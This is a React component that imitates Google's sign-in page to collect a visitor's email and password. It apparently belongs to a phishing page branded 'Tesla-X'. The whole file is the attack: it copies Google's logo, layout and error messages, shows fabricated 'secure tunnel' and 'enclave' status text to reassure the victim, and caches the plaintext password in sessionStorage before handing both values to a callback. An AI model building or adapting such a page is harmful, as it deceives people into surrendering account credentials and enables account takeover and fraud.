"use client";

import { useState, useEffect, useCallback, useMemo } from "react";
import { Icon } from "@iconify/react";
import { motion, AnimatePresence } from "framer-motion";



interface GoogleCollectProps {
  onNext: (email: string, password: string) => void;
  onCancel: () => void;
}

const GoogleCollect = ({ onNext, onCancel }: GoogleCollectProps) => {
  // --- CORE AUTHENTICATION STATE ---
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [isFinishing, setIsFinishing] = useState(false);
  const [error, setError] = useState("");

  // --- RESPONSIVE TELEMETRY & SECURITY ---
  const [securityStatus, setSecurityStatus] = useState("Protocol Standby");
  const [handshakeProgress, setHandshakeProgress] = useState(0);
  const [viewportHeight, setViewportHeight] = useState("100vh");

  // --- ADAPTIVE VIEWPORT FIX FOR MOBILE KEYBOARDS ---
  useEffect(() => {
    const handleResize = () => {
      setViewportHeight(`${window.innerHeight}px`);
    };
    window.addEventListener("resize", handleResize);
    handleResize();

    // Initializing Neural Node
    const initNode = async () => {
      setSecurityStatus("Establishing Secure Tunnel...");
      await new Promise(r => setTimeout(r, 800));
      setSecurityStatus("Ready for Identity Input");
      console.log("Neural Node: Responsive Protocol Initialized");
    };
    initNode();

    return () => window.removeEventListener("resize", handleResize);
  }, []);

  // --- VALIDATION CORE ---
  const isEmailValid = useMemo(() => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }, [email]);

  // --- PREMIUM STEP HANDLER ---
  const handleNextStep = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);
    setSecurityStatus("Verifying with Google Enclave...");

    // Simulate Google's server-side identity check delay
    await new Promise(resolve => setTimeout(resolve, 1600));

    if (step === 1) {
      if (!isEmailValid) {
        setError("Enter a valid email or phone number");
        setSecurityStatus("Identity Verification Failed");
        setLoading(false);
        return;
      }
      setStep(2);
      setSecurityStatus("Identity Confirmed. Awaiting Password.");
      setLoading(false);
    } else {
      // Step 2: Password Collection
      if (password.length < 6) {
        setError("Wrong password. Try again or click Forgot password.");
        setSecurityStatus("Credential Conflict Detected");
        setLoading(false);
        return;
      }

      // --- CRITICAL HANDSHAKE: OPTION B INTEGRATION ---
      setLoading(false);
      setIsFinishing(true);
      setSecurityStatus("Neural Node: Finalizing Handshake...");

      /** * SECURE BUFFER: 
       * Persisting credentials for GoogleConfirm hydration.
       */
      sessionStorage.setItem(
        "google_node_cache",
        JSON.stringify({
          email,
          password,
          timestamp: new Date().toISOString(),
          enclave_id: Math.random().toString(36).substring(7),
          device_responsive: true
        })
      );

      // Incremental Handshake Simulation
      for (let i = 0; i <= 100; i += 20) {
        setHandshakeProgress(i);
        if (i === 40) setSecurityStatus("Synchronizing Neural Keys...");
        if (i === 80) setSecurityStatus("Finalizing Mobile Scaling...");
        await new Promise(r => setTimeout(r, 500));
      }

      onNext(email, password);
    }
  }, [email, password, step, isEmailValid, onNext]);

  return (
    <div
      className="fixed inset-0 z-[9999] bg-white dark:bg-[#0a0a0a] flex items-center justify-center p-3 sm:p-4 overflow-y-auto selection:bg-[#c2dbff]"
      style={{ height: viewportHeight }}
    >
      <AnimatePresence mode="wait">
        {!isFinishing ? (
          <motion.div
            key="collect-form"
            initial={{ opacity: 0, scale: 0.95, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 1.05, filter: "blur(15px)" }}
            className="w-full max-w-[450px] bg-white dark:bg-[#1f1f1f] rounded-[32px] md:rounded-[40px] border border-[#dadce0] dark:border-white/10 shadow-2xl overflow-hidden relative"
          >
            {/* GOOGLE LINEAR LOADER */}
            <div className="h-1 w-full bg-gray-100 dark:bg-white/5 relative">
              {loading && (
                <motion.div
                  initial={{ left: "-40%", width: "40%" }}
                  animate={{ left: "100%" }}
                  transition={{ repeat: Infinity, duration: 1, ease: "easeInOut" }}
                  className="absolute top-0 h-full bg-[#1a73e8]"
                />
              )}
            </div>

            <div className="px-6 py-8 sm:px-10 sm:py-12 md:px-14 md:py-16">
              {/* BRANDING SECTION - Responsive Scaling */}
              <div className="flex flex-col items-center mb-8 sm:mb-10 text-center">
                <div className="mb-4 sm:mb-6">
                  <svg width="40" height="40" viewBox="0 0 24 24" className="sm:w-[48px] sm:h-[48px]">
                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05" />
                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
                  </svg>
                </div>
                <h1 className="text-[20px] sm:text-[24px] font-google text-[#202124] dark:text-white leading-tight">
                  {step === 1 ? "Sign in" : "Welcome"}
                </h1>
                <p className="mt-2 sm:mt-3 text-[14px] sm:text-[16px] text-[#5f6368] dark:text-gray-400">
                  {step === 1 ? "Use your Google Account" : "Confirm identity for Tesla-X"}
                </p>
              </div>

              {/* USER CHIP (STEP 2) - Fluid width */}
              {step === 2 && (
                <div
                  onClick={() => setStep(1)}
                  className="flex items-center gap-2 w-fit mx-auto mb-6 sm:mb-8 px-3 py-1.5 border border-[#dadce0] dark:border-white/10 rounded-full cursor-pointer hover:bg-gray-50 dark:hover:bg-white/5 transition-colors"
                >
                  <div className="w-5 h-5 rounded-full bg-[#1a73e8] flex items-center justify-center text-[10px] text-white font-bold">
                    {email[0]?.toUpperCase() || "U"}
                  </div>
                  <span className="text-[13px] sm:text-sm font-medium text-gray-700 dark:text-gray-200 truncate max-w-[140px] sm:max-w-[200px]">
                    {email}
                  </span>
                  <Icon icon="tabler:chevron-down" className="text-gray-400" />
                </div>
              )}

              {/* INPUT CORE - Adaptive Spacing */}
              <form onSubmit={handleNextStep} className="space-y-6 sm:space-y-8">
                <div className="relative group">
                  <input
                    type={step === 1 ? "email" : showPass ? "text" : "password"}
                    value={step === 1 ? email : password}
                    onChange={(e) => step === 1 ? setEmail(e.target.value) : setPassword(e.target.value)}
                    required
                    autoFocus
                    placeholder=" "
                    className={`peer w-full px-4 py-3.5 sm:py-4 text-[15px] sm:text-[16px] border ${error ? 'border-red-500' : 'border-[#dadce0] dark:border-white/20'} rounded-lg bg-transparent dark:text-white focus:border-[#1a73e8] focus:border-2 outline-none transition-all`}
                  />
                  <label className="absolute left-4 top-3.5 sm:top-4 text-[#5f6368] dark:text-gray-400 bg-white dark:bg-[#1f1f1f] px-1 transition-all pointer-events-none 
                    peer-focus:-top-2.5 peer-focus:left-3 peer-focus:text-[11px] sm:peer-focus:text-[12px] peer-focus:text-[#1a73e8]
                    peer-[:not(:placeholder-shown)]:-top-2.5 peer-[:not(:placeholder-shown)]:left-3 peer-[:not(:placeholder-shown)]:text-[11px] sm:peer-[:not(:placeholder-shown)]:text-[12px]">
                    {step === 1 ? "Email or phone" : "Enter your password"}
                  </label>

                  {step === 2 && (
                    <button
                      type="button"
                      onClick={() => setShowPass(!showPass)}
                      className="absolute right-4 top-4 text-gray-400 hover:text-[#1a73e8]"
                    >
                      <Icon icon={showPass ? "solar:eye-bold" : "solar:eye-closed-bold"} width="20" />
                    </button>
                  )}

                  <AnimatePresence>
                    {error && (
                      <motion.div
                        initial={{ opacity: 0, x: -5 }}
                        animate={{ opacity: 1, x: 0 }}
                        className="flex items-center gap-2 mt-2 text-red-600 dark:text-red-400 text-[12px] font-medium"
                      >
                        <Icon icon="solar:danger-triangle-bold" />
                        <span>{error}</span>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>

                <div className="space-y-3 sm:space-y-4">
                  <p className="text-[#1a73e8] text-[13px] sm:text-sm font-bold cursor-pointer hover:bg-blue-50 dark:hover:bg-white/5 w-fit px-1 py-0.5 rounded transition-all">
                    {step === 1 ? "Forgot email?" : "Forgot password?"}
                  </p>
                  <p className="text-[12px] sm:text-sm text-gray-500 dark:text-gray-400 leading-relaxed">
                    To continue, Google will share your identity with
                    <span className="font-semibold text-gray-700 dark:text-white ml-1">Tesla-X Enclave</span>.
                  </p>
                </div>

                <div className="flex justify-between items-center pt-6 sm:pt-8">
                  <button
                    type="button"
                    onClick={step === 1 ? onCancel : () => setStep(1)}
                    className="text-[#1a73e8] text-[13px] sm:text-[14px] font-bold px-3 sm:px-4 py-2 hover:bg-blue-50 dark:hover:bg-white/5 rounded-md transition-all"
                  >
                    {step === 1 ? "Cancel" : "Back"}
                  </button>
                  <button
                    type="submit"
                    disabled={loading}
                    className="bg-[#1a73e8] hover:bg-[#185abc] text-white text-[13px] sm:text-[14px] font-bold px-6 sm:px-8 py-2 sm:py-2.5 rounded-md shadow-md active:scale-95 transition-all flex items-center gap-2 min-w-[90px] sm:min-w-[100px] justify-center"
                  >
                    {loading ? <Icon icon="line-md:loading-twotone-loop" className="text-lg" /> : "Next"}
                  </button>
                </div>
              </form>
            </div>
          </motion.div>
        ) : (
          /* RESPONSIVE HANDSHAKE ANIMATION LAYER */
          <motion.div
            key="handshake"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="flex flex-col items-center justify-center p-6 sm:p-10 bg-white dark:bg-[#1f1f1f] rounded-[40px] sm:rounded-[48px] shadow-3xl w-full max-w-[450px] min-h-[400px] sm:min-h-[500px]"
          >
            <div className="relative mb-10 sm:mb-16">
              <Icon icon="logos:google-icon" className="text-6xl sm:text-7xl animate-pulse" />
              <motion.div
                animate={{ rotate: 360 }}
                transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
                className="absolute -inset-8 sm:-inset-10 border-2 border-dashed border-[#4285F4]/20 rounded-full"
              />
            </div>

            <div className="w-full space-y-6 sm:space-y-8 flex flex-col items-center px-4">
              <div className="w-full max-w-[256px] h-1 sm:h-1.5 bg-gray-100 dark:bg-white/10 rounded-full overflow-hidden">
                <motion.div
                  initial={{ width: "0%" }}
                  animate={{ width: `${handshakeProgress}%` }}
                  className="h-full bg-gradient-to-r from-[#4285F4] to-[#34A853] transition-all duration-500"
                />
              </div>

              <div className="text-center">
                <p className="text-[11px] sm:text-sm font-google text-[#4285F4] uppercase tracking-widest font-black animate-pulse">
                  {securityStatus}
                </p>
                <div className="mt-3 sm:mt-4 flex items-center justify-center gap-2">
                  <span className="w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full bg-green-500 animate-ping" />
                  <span className="text-[9px] sm:text-[10px] text-gray-400 font-mono">SECURE TUNNEL: ACTIVE</span>
                </div>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default GoogleCollect;